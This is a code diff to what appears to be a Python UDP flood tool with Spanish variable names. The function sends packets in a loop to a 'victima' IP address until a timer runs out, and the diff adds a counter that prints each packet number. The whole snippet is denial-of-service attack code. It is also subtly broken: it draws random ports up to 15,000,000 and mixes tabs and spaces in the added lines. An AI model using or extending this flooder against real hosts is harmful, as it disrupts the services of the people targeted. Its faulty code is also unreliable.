@@ -20,6 +20,7 @@ def main():
         UDP()
 
 def UDP():
+    count = 0
     puertoo = port
     randport=(True,False)[port==0]
     ip = victima
@@ -33,7 +34,9 @@ def UDP():
     while True:
         puertoo=(random.randint(1,15000000),puertoo)[randport]
         if tiempo()<tiempotion:
+	    count = count + 1
             sock.sendto(bytes,(ip,puertoo))
+	    print("Paquete #" + str(count))
         else:
             break
     os.system("cls || clear")
